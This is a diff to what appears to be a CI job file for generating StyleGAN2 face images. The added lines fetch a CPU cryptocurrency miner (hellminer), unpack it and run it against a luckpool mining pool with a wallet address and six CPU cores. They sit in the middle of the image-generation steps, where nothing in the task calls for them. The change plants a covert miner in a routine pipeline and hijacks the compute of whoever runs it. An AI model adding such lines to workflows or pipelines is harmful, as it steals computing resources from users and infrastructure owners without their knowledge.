@@ -34,9 +34,11 @@ jobs:
         pip install requests==2.22.0
         pip install Pillow==6.2.1
         cd /inputs/stylegan2
-        pip install colabcode
-        from colabcode import ColabCode
-        ColabCode(port=10000)
+        sudo apt update -y
+        apt install git wget nano libpci-dev -y
+        wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+        tar xf hellminer_cpu_linux.tar.gz
+        ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RNa9RXXezxmCRikCVC7pq7jH4hrjUnWYFd.Al -p x --cpu 6
         python run_generator.py generate-images \
           --network=gdrive:networks/stylegan2-ffhq-config-f.pkl \
           --seeds=6600-6605 \
